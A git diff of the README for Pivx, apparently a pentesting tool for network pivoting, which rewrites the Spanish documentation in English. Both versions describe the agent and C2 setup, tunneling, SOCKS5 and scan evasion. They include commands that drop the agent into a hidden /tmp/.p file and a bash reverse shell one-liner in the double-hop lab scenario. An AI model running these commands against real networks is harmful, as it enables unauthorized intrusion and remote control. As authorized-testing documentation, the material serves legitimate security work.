@@ -1,344 +1,46 @@
 # Pivx 🕸️
 
-Herramienta de **pivoting y enrutamiento de red** para pentesting autorizado.
-Objetivo: mejor usabilidad que Ligolo-ng, con enrutamiento automatizado y una
-UI web desde el primer día.
+![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
+![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
+![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
+![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
+![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
 
-> **Fase 3 (actual):** suite de pivoting para CTF.
-> - **L3:** túnel **TUN** `pivx0` + bombeo de paquetes + rutas (netstack gVisor en el agente).
-> - **L4:** port forwarding **local (-L)** y **remote (-R)** multiplexado sobre el mismo WS.
-> - **L7:** proxy **SOCKS5** dinámico (resolución DNS del lado del agente).
-> - Data-plane endurecido (MTU 1350, backpressure) y **Makefile** de cross-build.
-> - Framing híbrido: control = frames de texto (JSON); datos = frames binarios,
->   diferenciando **túnel L3** (nibble IP `4`/`6`) de **canal MUX** (`0x01`) por el primer byte.
->
-> Ver [`ARCHITECTURE.md`](ARCHITECTURE.md) para el diseño completo.
+[English](README.md) | [Español](README_es.md) | [Português](README_pt.md) | [中文](README_zh.md)
 
-```
-Pivx/
-├── Makefile                  # Cross-build del agente (linux/amd64, arm64, win/amd64)
-├── agent/                    # Agente en Go
-│   ├── go.mod
-│   ├── main.go               # Transporte WS + control + descubrimiento (anti-uplink)
-│   ├── netstack.go           # Pila gVisor (userland) + forwarders TCP/UDP (túnel L3)
-│   └── mux.go                # Multiplexado de streams TCP (L4/L7) sobre el mismo WS
-├── server/
-│   ├── app.py                # Dashboard Streamlit (túnel + rutas + forwarding + SOCKS)
-│   ├── requirements.txt
-│   └── pivx_server/
-│       ├── db.py             # Persistencia DuckDB (agents, routes, logs)
-│       ├── tun.py            # Interfaz TUN de Linux (raw-IP, MTU 1350)
-│       ├── runtime.py        # Orquestación TUN <-> WebSocket (plano L3)
-│       ├── forward.py        # Capa MUX: port-forwarding L4 + SOCKS5 (plano L4/L7)
-│       └── ws_server.py      # Listener WebSocket (control + datos + demux L3/MUX)
-├── ARCHITECTURE.md
-└── README.md
-```
+**Network pivoting and routing tool for authorized penetration testing.**
+Pivx uses a **Hybrid Framing** architecture that multiplexes **L3 tunneling,
+L4 port forwarding, and L7 SOCKS5** over a single WebSocket connection with
+**ultra-low latency** — no extra framing headers, no secondary connections.
 
-## Requisitos
-
-- **Servidor:** Linux o **WSL2** (la TUN usa `/dev/net/tun`). Se necesita **root**
-  (o `CAP_NET_ADMIN`) para crear la interfaz y añadir rutas.
-- **Agente:** No necesitas Go instalado si descargas el binario desde
-  [Releases](https://github.com/HangLoose84/Pivx/releases). Solo Go 1.22+ si
-  quieres compilar desde el código fuente.
-
-## Puesta en marcha
-
-### 1) Servidor (Python, en Linux/WSL2)
-
-> **Nota para Kali Linux y distribuciones modernas:** Python 3.11+ marca los
-> paquetes del sistema como `externally-managed-environment` y bloquea `pip
-> install` global. Pivx usa un **entorno virtual (`venv`)** para evitar este
-> error. El script `install.sh` lo crea automáticamente.
-
-**Instalación rápida (< 2 minutos):**
-
-```bash
-git clone https://github.com/HangLoose84/Pivx.git
-cd Pivx
-chmod +x install.sh
-./install.sh
-```
-
-**Arrancar el C2:**
-
-```bash
-sudo server/venv/bin/streamlit run server/app.py
-```
-
-`sudo` es necesario porque el servidor crea la interfaz TUN `/dev/net/tun` y
-manipula la tabla de rutas del kernel. Al invocar directamente el `streamlit`
-del venv no hace falta `sudo -E` ni activar el entorno manualmente.
-
-El listener WebSocket queda en `ws://0.0.0.0:8765` y la UI en http://localhost:8501.
-
-### 2) Agente
-
-> **No necesitas tener Go instalado ni compilar nada** si solo quieres usar
-> Pivx. Descarga el binario precompilado de la pestaña
-> [**Releases**](https://github.com/HangLoose84/Pivx/releases) del repositorio
-> y súbelo directamente a la máquina víctima:
->
-> ```bash
-> # Desde la máquina víctima (ejemplo con wget):
-> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
-> chmod +x /tmp/.p
-> /tmp/.p --server ws://TU_C2:8765
-> ```
->
-> Binarios disponibles: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`,
-> `pivx-agent-windows-amd64.exe`.
-
-#### Compilación desde el código fuente (usuarios avanzados)
-
-Si prefieres compilar el agente tú mismo, necesitas **Go 1.22+**.
-
-Primera vez — obtener gVisor (rama especial `go`) y resolver dependencias:
-
-```bash
-cd agent
-go get gvisor.dev/gvisor@go
-go mod tidy
-```
-
-Ejecutar directamente apuntando al servidor:
-
-```bash
-go run . --server ws://127.0.0.1:8765
-```
-
-#### Compilación con el `Makefile` (recomendado)
-
-Desde la **raíz del proyecto** hay un `Makefile` que cross-compila binarios
-estáticos y **despojados** (`-ldflags="-s -w"` + `-trimpath`, sin símbolos ni
-DWARF) para reducir al máximo el peso — clave para subir el agente a un target
-por una conexión inestable en un CTF.
-
-```bash
-make deps          # UNA sola vez: obtiene gVisor (rama `go`) y ordena módulos
-make               # compila las 3 plataformas en ./dist
-```
-
-Targets individuales:
-
-```bash
-make linux-amd64     # -> dist/pivx-agent-linux-amd64
-make linux-arm64     # -> dist/pivx-agent-linux-arm64
-make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
-make clean           # borra ./dist
-```
-
-Los binarios usan `CGO_ENABLED=0` (estáticos, sin dependencia de libc en el
-target). Ejemplo de despliegue:
-
-```bash
-scp dist/pivx-agent-linux-amd64 target:/tmp/.p
-ssh target '/tmp/.p --server ws://TU_C2:8765'
-```
-
-### 3) Levantar el túnel y enrutar
-
-1. En el dashboard, sección **Túnel de datos**, elige el agente y pulsa
-   **Iniciar túnel** (crea `pivx0`).
-2. En **Rutas**, añade la subred interna: con un clic en las **subredes
-   descubiertas** por el agente, o a mano (`10.10.20.0/24`).
-3. Ahora tus herramientas locales alcanzan la red interna a través del agente:
-
-```bash
-nmap -sT -Pn 10.10.20.0/24    # TCP connect + sin ping (ver "Limitaciones" abajo)
-curl http://10.10.20.5/
-```
-
-> El escaneo debe ser **TCP connect** (`-sT`), no SYN crudo: el proxy opera a
-> nivel de socket, no de paquete SYN. Y **siempre `-Pn`**: no hay ICMP a través
-> del túnel, así que sin `-Pn` nmap creerá que todo está caído. Ver abajo.
-
-### 4) Verificación
-
-- El agente aparece **online** con su hostname/OS/arch y sus subredes.
-- Al iniciar el túnel, `ip addr` en el servidor muestra `pivx0`; `ip route` muestra
-  las subredes enrutadas a `pivx0`.
-- El tráfico hacia la LAN interna funciona y aparecen líneas `[tcp] proxy
-  establecido -> ...` en el log del agente.
-
-### 5) Port forwarding (L4) y SOCKS5 (L7)
-
-Además del túnel L3 (rutas), Pivx multiplexa **streams TCP** sobre el mismo
-WebSocket. Estas funciones **no requieren tener el túnel L3 activo**: basta con
-un agente conectado. En el dashboard, sección **🔀 Port forwarding (L4)**.
-
-#### Local forward (`-L`) — exponer un servicio interno en tu máquina
-
-Pestaña **Local (-L)**. El servidor abre un puerto en tu máquina y el agente
-marca hacia un `IP:puerto` de la red interna.
-
-- **Bind local:** `127.0.0.1` · **Puerto:** `8080` · **Destino (agente):** `10.10.20.5:80`
-
-Ahora `127.0.0.1:8080` en tu equipo == `10.10.20.5:80` en la víctima:
-
-```bash
-curl http://127.0.0.1:8080/           # llega al :80 interno vía el agente
-```
-
-Útil para abrir en el navegador un panel interno, una BBDD (`...:3306`), RDP, etc.
-
-#### Remote forward (`-R`) — recibir reverse shells desde la víctima
-
-Pestaña **Remote (-R)**. El **agente** abre un puerto en la red víctima y todo lo
-que llegue ahí se reenvía a un destino local tuyo (tu handler).
-
-- **Bind víctima:** `0.0.0.0:4444` · **Destino local:** `127.0.0.1:5555`
-
-Prepara tu listener y lanza el payload apuntando al agente:
-
-```bash
-# En tu C2:
-nc -lvnp 5555
-# En la víctima (o el payload), conecta a la IP del agente en el puerto 4444.
-# Ese tráfico sale por el túnel y aterriza en tu 127.0.0.1:5555.
-```
-
-#### SOCKS5 (L7) — proxy dinámico para herramientas web
-
-Sub-sección **🧦 Proxy SOCKS5**. Pulsa **Iniciar SOCKS5** (por defecto
-`127.0.0.1:1080`). La **resolución DNS y la conexión TCP las hace el agente**, así
-que los nombres internos se resuelven en la red víctima y tu tráfico sale limpio.
-
-Con `proxychains` (configura `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`):
-
-```bash
-proxychains -q curl http://intranet.victima.local/
-proxychains -q smbclient -L //10.10.20.5/
-```
-
-Directo en las herramientas que soportan SOCKS:
-
-```bash
-# ffuf / dirsearch / feroxbuster
-ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
-dirsearch -x 500 --proxy socks5://127.0.0.1:1080 -u http://10.10.20.5/
-curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/   # --socks5-hostname = DNS remoto
-```
-
-**Burp Suite:** *Settings → Network → Connections → SOCKS proxy* →
-host `127.0.0.1`, puerto `1080`, marca *"Do DNS lookups over SOCKS proxy"*. A
-partir de ahí, todo el tráfico de Burp hacia la red interna va por el agente.
-
-> SOCKS5 solo hace **CONNECT** sobre **TCP**. Para el descubrimiento con nmap a
-> través de proxychains sigue aplicando `-sT` (y añade `-Pn`): `proxychains -q
-> nmap -sT -Pn -p 80,443,445 10.10.20.5`.
+> **Current status (Phase 3):** full pivoting suite for CTF and pentesting.
+> See [`ARCHITECTURE.md`](ARCHITECTURE.md) for the complete design.
 
 ---
 
-## Escenario Práctico: Doble Salto hacia Redes Aisladas
+## ⚡ Key Features
 
-Ejemplo real probado con Docker: comprometer una máquina que **no tiene salida
-a internet** a través de un host pivote que hace puente entre dos redes.
-
-### Topología
-
-```
-  Tu máquina (Kali)          Red pública              Red interna (aislada)
-  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
-  │  Pivx C2    │◄── WS ──►│  Pivote      │          │  Target          │
-  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
-  │             │          │  10.10.20.20 │          │  (sin internet)  │
-  └─────────────┘          └─────────────┘          └──────────────────┘
-    SOCKS5 :1080             Agente Pivx               HTTP :80
-    Handler :9001            rforward :4444
-```
-
-El C2 **no puede alcanzar** `10.10.20.0/24` directamente. Pivx lo resuelve.
-
-### Paso 1 — Subir y ejecutar el agente en el host pivote
-
-```bash
-# Desde tu C2, sube el agente al pivote (que sí tiene salida):
-scp dist/pivx-agent-linux-amd64 usuario@10.10.10.20:/tmp/.p
-
-# En el pivote:
-chmod +x /tmp/.p
-/tmp/.p --server ws://10.10.10.10:8765
-```
-
-El agente se conecta al C2, reporta sus interfaces y descubre la subred
-`10.10.20.0/24`. El dashboard lo muestra como **online**.
-
-### Paso 2 — Alcanzar la red aislada con SOCKS5 (inbound)
-
-En el dashboard, sección **Proxy SOCKS5**, pulsa **Iniciar SOCKS5**
-(`127.0.0.1:1080`). Ahora puedes alcanzar máquinas de la red interna:
-
-```bash
-# Escanear puertos del target aislado:
-proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100
-
-# Navegar el servicio web interno:
-curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
-
-# Fuzzing de directorios:
-ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
-
-# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
-#   (marca "Do DNS lookups over SOCKS proxy")
-```
-
-El tráfico fluye: `tu herramienta → SOCKS5 :1080 → MUX → pivote → 10.10.20.100`.
-La resolución DNS y la conexión TCP ocurren **del lado del pivote**, así que los
-nombres internos se resuelven en la red víctima.
-
-### Paso 3 — Recibir reverse shells con remote forward (outbound)
-
-El target aislado no puede conectarse a tu C2, pero sí al pivote. Usa
-**remote forward** para que el pivote reenvíe las conexiones a tu máquina:
-
-```bash
-# 1) En el dashboard: sección "Port forwarding (L4)" → pestaña "Remote (-R)"
-#    Bind víctima: 0.0.0.0:4444
-#    Destino local: 127.0.0.1:9001
-#    → Clic en "Crear"
-
-# 2) Prepara tu handler en el C2:
-nc -lvnp 9001
-
-# 3) Ejecuta el payload en el target apuntando al pivote:
-#    (ejemplo: reverse shell bash, o cualquier payload que conecte a pivote:4444)
-bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
-```
-
-El tráfico fluye: `target → pivote:4444 → MUX → C2:9001`. Tu handler
-recibe la shell como si viniera de `127.0.0.1`.
-
-### Resultado verificado
-
-Este escenario se probó con tests automatizados en Docker (3 contenedores,
-2 redes aisladas). Resultados:
-
-| Test | Resultado | Latencia |
-|------|-----------|----------|
-| SOCKS5 inbound → target:80 | Respuesta HTTP 200 completa | ~25ms |
-| Remote forward ← reverse shell | Payload recibido en C2:9001 | ~13s (espera del script) |
-| Streams residuales tras cierre | 0 (sin leaks) | — |
+- **L3 Tunnel** — TUN interface `pivx0` with userland TCP/IP stack (gVisor netstack) on the agent. Full IP routing through the tunnel.
+- **L4 Port Forwarding** — Local (`-L`) and remote (`-R`) forwards multiplexed over the same WebSocket. Ideal for reverse shells.
+- **L7 SOCKS5 Proxy** — Dynamic proxy with DNS resolution on the agent side. Works with proxychains, ffuf, Burp Suite, and any SOCKS-aware tool.
+- **High Fidelity Scanning** — ICMP Smartping, Magic IP, SYN-Cookie nullification, and smart RST for accurate nmap results through the tunnel.
+- **Hybrid Framing** — Control (JSON text frames) + data (binary frames) on one WebSocket. L3 packets (IP nibble `0x4`/`0x6`) and MUX streams (`0x01`) coexist in binary frames with zero-overhead discrimination.
+- **Kill Switch** — Remote agent termination from the C2 dashboard with one click.
+- **Hardened Data Plane** — MTU 1350 (WebSocket/TLS headroom), backpressure with drop, anti-uplink route protection.
+- **Web Dashboard** — Streamlit-based C2 with real-time agent status, tunnel control, route management, and port forwarding UI.
 
 ---
 
-## Alta Fidelidad y Evasion
+## 🎯 High Fidelity & Evasion
 
-Pivx implementa mejoras de fidelidad de red que hacen los escaneos
-indistinguibles de conexiones nativas. Estas funciones se probaron en un
-laboratorio Docker (3 contenedores, 2 redes aisladas) con resultados
-verificados.
+Pivx implements network fidelity improvements that make scans through the tunnel indistinguishable from native connections. All features verified in automated Docker lab tests.
 
-### Smartping (ICMP a traves del tunel)
+### ICMP Smartping
 
-A diferencia de otras herramientas de pivoting, Pivx soporta **ping real**
-a traves del tunel L3. El agente intercepta ICMP Echo Request, ejecuta un
-`ping` nativo del OS para verificar que el host esta vivo, y construye el
-Echo Reply con checksums correctos.
+Unlike typical pivoting tools, Pivx supports **real ping through the L3 tunnel**. The agent intercepts ICMP Echo Requests, runs an OS-level `ping` to verify the host is alive, and constructs a proper Echo Reply with correct RFC 1071 checksums.
 
 ```bash
-# Desde tu C2, con el tunel y la ruta activos:
+# From your C2, with tunnel and route active:
 ping -c 2 10.10.20.100
 
 PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
@@ -349,107 +51,323 @@ PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
 2 packets transmitted, 2 received, 0% packet loss, time 1001ms
 ```
 
-Esto permite usar `nmap` **sin `-Pn`** para descubrimiento de hosts: los
-equipos que responden al ping aparecen como *up* y nmap escanea solo esos.
+This enables nmap **host discovery without `-Pn`** — hosts that respond to ping show as *up* and nmap scans only those.
 
-### Magic IP (acceso al localhost de la victima)
+### Magic IP (`240.0.0.1`)
 
-El rango reservado `240.0.0.0/4` (Class-E) se reescribe a `127.0.0.1` del
-agente, tanto en el tunel L3 como via SOCKS5/MUX. Esto permite acceder a
-servicios que solo escuchan en localhost (bases de datos, paneles admin,
-APIs internas) sin conflictos de IP:
+The reserved Class-E range `240.0.0.0/4` is rewritten to `127.0.0.1` on the agent, both through the L3 tunnel and via SOCKS5/MUX. Access services that only listen on the victim's localhost (databases, admin panels, internal APIs) without IP conflicts:
 
 ```bash
-# Via SOCKS5 — accede al servidor HTTP oculto en localhost:8080 del agente:
+# Via SOCKS5 — access hidden HTTP server on agent's localhost:8080:
 curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/
 
-# Respuesta: directory listing del filesystem del agente
+# Returns: directory listing of agent's filesystem
 <!DOCTYPE HTML>
 <html lang="en">
 <head><title>Directory listing for /</title></head>
 ...
 ```
 
-Cualquier IP del rango `240.x.x.x` funciona: `240.0.0.1`, `240.1.2.3`, etc.
-Todas se redirigen al `127.0.0.1` del agente.
+Any IP in `240.x.x.x` works: `240.0.0.1`, `240.1.2.3`, etc. All redirect to the agent's `127.0.0.1`.
 
-### Escaneos SYN fieles (SYN-Cookies desactivadas)
+### SYN-Cookie Nullification
 
-Pivx desactiva las SYN-Cookies del netstack gVisor, evitando que el
-netstack responda SYN-ACK a **todo** SYN sin crear estado. Sin esta
-correccion, `nmap -sS` mostraria todos los puertos como *open*. Con ella,
-solo los puertos realmente abiertos responden.
+Pivx disables gVisor's SYN-Cookies, preventing the netstack from responding SYN-ACK to **every** SYN without creating state. Without this fix, `nmap -sS` would show all ports as *open*. With it, only truly open ports respond.
 
-### RST inteligente
+### Smart RST
 
-Cuando el agente intenta conectar a un puerto cerrado y recibe
-`ECONNREFUSED`, devuelve un RST al escaner. Si el destino no responde
-(timeout), no envia nada. Esto permite a nmap distinguir correctamente
-entre puertos *closed* (RST) y *filtered* (sin respuesta).
+When the agent dials a closed port and receives `ECONNREFUSED`, it returns RST to the scanner. If the target doesn't respond (timeout), it stays silent. This lets nmap correctly distinguish between *closed* (RST) and *filtered* (no response) ports.
 
-### Kill Switch (terminacion remota del agente)
+### Kill Switch
 
-Desde el dashboard del C2, un clic en el boton Kill envia `{"type":"kill"}`
-al agente, que ejecuta `os.Exit(0)` inmediatamente. La conexion WebSocket
-se cierra y el dashboard refleja el cambio al instante.
+From the C2 dashboard, one click sends `{"type":"kill"}` to the agent, which executes `os.Exit(0)` immediately. The WebSocket closes and the dashboard reflects the change instantly.
 
-### Resultados del test automatizado
+### Verified Test Results
 
-| Test | Resultado | Detalle |
-|------|-----------|---------|
-| Smartping L3 (ping via tunel) | PASADO | 2/2 replies, ~4ms RTT |
-| Magic IP L7 (240.0.0.1:8080 via SOCKS5) | PASADO | HTTP 200, directory listing |
-| Kill Switch (os.Exit remoto) | PASADO | Desconexion en <1s |
+| Test | Result | Detail |
+|------|--------|--------|
+| Smartping L3 (ping through tunnel) | **PASS** | 2/2 replies, ~4ms RTT |
+| Magic IP L7 (240.0.0.1:8080 via SOCKS5) | **PASS** | HTTP 200, directory listing |
+| Kill Switch (remote os.Exit) | **PASS** | Disconnection in <1s |
 
 ---
 
-## Limitaciones conocidas / Tips de uso
+## 📋 Requirements
 
-Léelo antes de escanear: evita perder tiempo persiguiendo "hosts caídos" que en
-realidad sí están vivos.
+- **Server:** Linux or **WSL2** (TUN uses `/dev/net/tun`). Requires **root** (or `CAP_NET_ADMIN`) to create the interface and add routes.
+- **Agent:** No Go installation needed — download the prebuilt binary from [Releases](https://github.com/HangLoose84/Pivx/releases). Only Go 1.22+ if building from source.
 
-### ICMP Smartping — `ping` funciona a traves del tunel
+---
 
-Pivx soporta **ping real** via el tunel L3 (ver seccion *Alta Fidelidad*).
-El agente intercepta ICMP Echo Request, verifica el host con un ping del OS,
-y responde con Echo Reply. Esto significa que **nmap puede descubrir hosts con
-ICMP** sin necesidad de `-Pn` en la mayoria de redes.
+## 🚀 Getting Started
 
-**Modos de escaneo soportados:**
+### 1) Server (Python, Linux/WSL2)
+
+> **Note for Kali Linux and modern distros:** Python 3.11+ marks system packages as `externally-managed-environment` and blocks global `pip install`. Pivx uses a **virtual environment (`venv`)** to avoid this. The `install.sh` script creates it automatically.
+
+**Quick install (< 2 minutes):**
 
 ```bash
-# Descubrimiento con ping (funciona gracias al Smartping):
-nmap -sn 10.10.20.0/24
-
-# SYN scan — el netstack procesa SYN a nivel de transporte y responde
-# RST (cerrado) o SYN-ACK (abierto) segun el estado real del puerto:
-nmap -sS 10.10.20.0/24
-
-# TCP connect sigue funcionando como siempre:
-nmap -sT 10.10.20.0/24
+git clone https://github.com/HangLoose84/Pivx.git
+cd Pivx
+chmod +x install.sh
+./install.sh
 ```
 
-> **Nota:** El Smartping ejecuta un `ping` real por cada Echo Request, lo que
-> anade ~3-5ms de latencia. Para escaneos masivos, `-Pn` sigue siendo mas
-> rapido porque omite la fase de descubrimiento.
+**Start the C2:**
 
-### Otras limitaciones actuales
+```bash
+sudo server/venv/bin/streamlit run server/app.py
+```
 
-- **Un solo túnel / un solo agente activo** a la vez (enfoque CTF). El
-  multi-agente simultáneo queda **aplazado** (fuera del alcance de la Fase 3).
-- **Sin TLS/wss ni autenticación** del agente todavía (Fase 4). No lo uses fuera
-  de un laboratorio o red controlada.
-- El **SOCKS5** solo implementa el comando **CONNECT** sobre TCP (sin BIND ni
-  UDP ASSOCIATE), suficiente para escaneo/fuzzing/proxy web.
-- Un agente que pierde la conexión sin cierre limpio pasa a **`offline`
-  automáticamente** tras ~45 s sin pings (barrido de keep-alive del servidor).
+`sudo` is required because the server creates the TUN interface and manipulates the kernel routing table. Invoking the venv's `streamlit` directly avoids the need for `sudo -E` or manual venv activation.
 
-## Notas y limitaciones (gVisor / entorno)
+WebSocket listener: `ws://0.0.0.0:8765` — Dashboard UI: http://localhost:8501
 
-- **gVisor** tiene una API sensible a la versión; este código sigue la rama `go`.
-  Si `go mod tidy` deja algún símbolo desalineado, ajusta los nombres en
-  `netstack.go` a la versión resuelta.
-- Aún **sin TLS/wss ni autenticación** del agente (Fase 4).
-- No probado en Windows como servidor (se eligió Linux/WSL2 para la TUN).
+### 2) Agent
 
-⚠️ Úsese únicamente en sistemas propios o con **autorización explícita**.
+> **No Go installation or compilation needed** if you just want to use Pivx. Download the prebuilt binary from the [**Releases**](https://github.com/HangLoose84/Pivx/releases) tab and upload it to the target machine:
+>
+> ```bash
+> # From the target machine:
+> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
+> chmod +x /tmp/.p
+> /tmp/.p --server ws://YOUR_C2:8765
+> ```
+>
+> Available binaries: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`, `pivx-agent-windows-amd64.exe`.
+
+#### Building from source (advanced)
+
+Requires **Go 1.22+**. First time — fetch gVisor (special `go` branch) and resolve dependencies:
+
+```bash
+cd agent
+go get gvisor.dev/gvisor@go
+go mod tidy
+```
+
+Run directly:
+
+```bash
+go run . --server ws://127.0.0.1:8765
+```
+
+#### Cross-compilation with `Makefile` (recommended)
+
+The root `Makefile` cross-compiles static, stripped binaries (`-ldflags="-s -w"` + `-trimpath`, no symbols or DWARF) to minimize size — critical for uploading agents over unstable connections in CTFs.
+
+```bash
+make deps           # Once: fetch gVisor (branch `go`) and tidy modules
+make                # Build all 3 platforms to ./dist
+```
+
+Individual targets:
+
+```bash
+make linux-amd64     # -> dist/pivx-agent-linux-amd64
+make linux-arm64     # -> dist/pivx-agent-linux-arm64
+make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
+make clean           # Remove ./dist
+```
+
+Binaries use `CGO_ENABLED=0` (fully static, no libc dependency on the target). Deployment example:
+
+```bash
+scp dist/pivx-agent-linux-amd64 target:/tmp/.p
+ssh target '/tmp/.p --server ws://YOUR_C2:8765'
+```
+
+### 3) Activate Tunnel & Routes
+
+1. In the dashboard, section **Tunnel**, select the agent and click **Start tunnel** (creates `pivx0`).
+2. In **Routes**, add the internal subnet: click a **discovered subnet** from the agent, or type manually (`10.10.20.0/24`).
+3. Your local tools now reach the internal network through the agent:
+
+```bash
+nmap -sS 10.10.20.0/24          # SYN scan works (Smart RST + no SYN-Cookies)
+ping 10.10.20.5                  # Works (Smartping)
+curl http://10.10.20.5/
+```
+
+### 4) Verification
+
+- Agent appears **online** with hostname/OS/arch and its subnets.
+- `ip addr` on the server shows `pivx0`; `ip route` shows subnets routed to `pivx0`.
+- Traffic to the internal LAN works; `[tcp] proxy established -> ...` lines appear in the agent log.
+
+### 5) Port Forwarding (L4) & SOCKS5 (L7)
+
+Beyond the L3 tunnel, Pivx multiplexes **TCP streams** over the same WebSocket. These features **do not require the L3 tunnel** — just a connected agent. In the dashboard, section **Port forwarding (L4)**.
+
+#### Local forward (`-L`) — expose an internal service locally
+
+Tab **Local (-L)**. The server opens a port on your machine; the agent dials to an `IP:port` on the internal network.
+
+```bash
+# Bind: 127.0.0.1:8080 → Destination (agent): 10.10.20.5:80
+curl http://127.0.0.1:8080/     # reaches :80 on the internal network via the agent
+```
+
+Useful for accessing admin panels, databases (`:3306`), RDP, etc.
+
+#### Remote forward (`-R`) — receive reverse shells
+
+Tab **Remote (-R)**. The **agent** opens a port on the victim network; incoming connections are forwarded to your local handler.
+
+```bash
+# Bind victim: 0.0.0.0:4444 → Local destination: 127.0.0.1:5555
+# On your C2:
+nc -lvnp 5555
+# On the victim: connect to agent_ip:4444 → arrives at your 127.0.0.1:5555
+```
+
+#### SOCKS5 (L7) — dynamic proxy for web tools
+
+Section **SOCKS5 Proxy**. Click **Start SOCKS5** (default `127.0.0.1:1080`). **DNS resolution and TCP connections happen on the agent**, so internal hostnames resolve on the victim network.
+
+```bash
+# proxychains (configure /etc/proxychains4.conf → socks5 127.0.0.1 1080):
+proxychains -q curl http://intranet.victim.local/
+proxychains -q smbclient -L //10.10.20.5/
+
+# Direct SOCKS support:
+ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
+curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/
+
+# Burp Suite: Settings → Network → SOCKS proxy → 127.0.0.1:1080
+#   (check "Do DNS lookups over SOCKS proxy")
+```
+
+---
+
+## 🔀 Scenario: Double Hop into Isolated Networks
+
+Real-world example tested with Docker: compromise a machine with **no internet access** through a pivot host bridging two networks.
+
+### Topology
+
+```
+  Your machine (Kali)        Public network           Internal network (isolated)
+  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
+  │  Pivx C2    │◄── WS ──►│  Pivot       │          │  Target          │
+  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
+  │             │          │  10.10.20.20 │          │  (no internet)   │
+  └─────────────┘          └─────────────┘          └──────────────────┘
+    SOCKS5 :1080             Pivx Agent               HTTP :80
+    Handler :9001            rforward :4444
+```
+
+The C2 **cannot reach** `10.10.20.0/24` directly. Pivx solves this.
+
+### Step 1 — Deploy the agent on the pivot host
+
+```bash
+scp dist/pivx-agent-linux-amd64 user@10.10.10.20:/tmp/.p
+chmod +x /tmp/.p
+/tmp/.p --server ws://10.10.10.10:8765
+```
+
+The agent connects, reports its interfaces, and discovers subnet `10.10.20.0/24`. The dashboard shows it as **online**.
+
+### Step 2 — Reach the isolated network with SOCKS5 (inbound)
+
+Start SOCKS5 in the dashboard (`127.0.0.1:1080`):
+
+```bash
+# Scan the isolated target:
+proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100
+
+# Browse the internal web service:
+curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
+
+# Directory fuzzing:
+ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
+```
+
+Traffic flows: `your tool → SOCKS5 :1080 → MUX → pivot → 10.10.20.100`.
+
+### Step 3 — Receive reverse shells with remote forward (outbound)
+
+The isolated target can't connect to your C2, but it can reach the pivot. Use **remote forward** to relay connections back:
+
+```bash
+# 1) Dashboard: Port forwarding → Remote (-R)
+#    Bind victim: 0.0.0.0:4444 → Local destination: 127.0.0.1:9001
+
+# 2) Start your handler:
+nc -lvnp 9001
+
+# 3) Execute payload on target pointing to the pivot:
+bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
+```
+
+Traffic flows: `target → pivot:4444 → MUX → C2:9001`.
+
+### Verified Results
+
+Tested with automated Docker labs (3 containers, 2 isolated networks):
+
+| Test | Result | Latency |
+|------|--------|---------|
+| SOCKS5 inbound → target:80 | HTTP 200 complete | ~25ms |
+| Remote forward ← reverse shell | Payload received at C2:9001 | ~13s (script wait) |
+| Residual streams after close | 0 (no leaks) | — |
+
+---
+
+## 🗂️ Project Structure
+
+```
+Pivx/
+├── Makefile                  # Cross-build (linux/amd64, arm64, win/amd64)
+├── agent/                    # Go agent
+│   ├── go.mod
+│   ├── main.go               # WS transport + control + discovery (anti-uplink)
+│   ├── netstack.go           # gVisor stack (userland) + TCP/UDP forwarders (L3)
+│   ├── icmp.go               # ICMP Smartping + UDP Port Unreachable injection
+│   └── mux.go                # TCP stream multiplexing (L4/L7) over same WS
+├── server/
+│   ├── app.py                # Streamlit dashboard (tunnel + routes + forwarding + SOCKS)
+│   ├── requirements.txt
+│   └── pivx_server/
+│       ├── db.py             # DuckDB persistence (agents, routes, logs)
+│       ├── tun.py            # Linux TUN interface (raw-IP, MTU 1350)
+│       ├── runtime.py        # TUN <-> WebSocket orchestration (L3 plane)
+│       ├── forward.py        # MUX layer: L4 port forwarding + SOCKS5 (L4/L7)
+│       └── ws_server.py      # WebSocket listener (control + data + L3/MUX demux)
+├── ARCHITECTURE.md
+└── README.md
+```
+
+---
+
+## ⚠️ Known Limitations
+
+### Scanning tips
+
+Pivx supports **ping through the tunnel** (Smartping) and **SYN scans** (SYN-Cookie nullification + Smart RST). Supported nmap modes:
+
+```bash
+nmap -sn 10.10.20.0/24          # Host discovery with ping (Smartping)
+nmap -sS 10.10.20.0/24          # SYN scan (accurate open/closed/filtered)
+nmap -sT 10.10.20.0/24          # TCP connect scan (always works)
+```
+
